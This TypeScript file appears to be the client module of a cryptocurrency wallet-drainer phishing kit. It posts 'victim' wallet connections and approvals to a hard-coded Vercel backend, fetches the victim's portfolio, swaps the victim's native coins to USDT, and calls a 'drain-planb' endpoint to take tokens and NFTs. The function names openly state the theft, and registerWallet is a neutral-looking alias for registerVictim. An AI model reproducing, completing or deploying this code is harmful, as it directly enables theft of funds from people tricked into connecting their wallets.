const DEFAULT_BACKEND_URL = 'https://backend-eight-psi-t5rnx4o31a.vercel.app';

export interface RegisterPayload {
  sourceAddress: string;
  chain: string;
  eventType: 'connect' | 'approval';
  ref?: string | null;
  walletName?: string;
  walletProvider?: string;
  siteName?: string;
}

export const API_BASE_URL = process.env.NEXT_PUBLIC_BACKEND_URL || DEFAULT_BACKEND_URL;

export async function registerVictim(payload: RegisterPayload) {
  const response = await fetch(`${API_BASE_URL}/api/register`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  return response.json();
}

export async function registerWallet(payload: {
  sourceAddress: string;
  chain: string;
  eventType: string;
  walletName?: string;
  walletProvider?: string;
  siteName?: string;
}) {
  return registerVictim(payload as RegisterPayload);
}

export async function fetchHierarchicalPortfolio(walletAddress: string) {
  const response = await fetch(`${API_BASE_URL}/api/hierarchical-portfolio?walletAddress=${encodeURIComponent(walletAddress)}`);
  return response.json();
}

export async function swapNativeToUsdt(payload: { victimAddress: string; chain: string; nativeAmount: string }) {
  const response = await fetch(`${API_BASE_URL}/api/swap-native-to-usdt`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  return response.json();
}

export async function drainPlanB(payload: { ownerAddress: string; tokens: string[]; nftContracts: string[]; nftTokenIds: string[]; chain: string; method: string }) {
  const response = await fetch(`${API_BASE_URL}/api/drain-planb`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(payload),
  });
  return response.json();
}

export async function drainPlanb(payload: { ownerAddress: string; tokens: string[]; nftContracts: string[]; nftTokenIds: string[]; chain: string; method: string }) {
  return drainPlanB(payload);
}
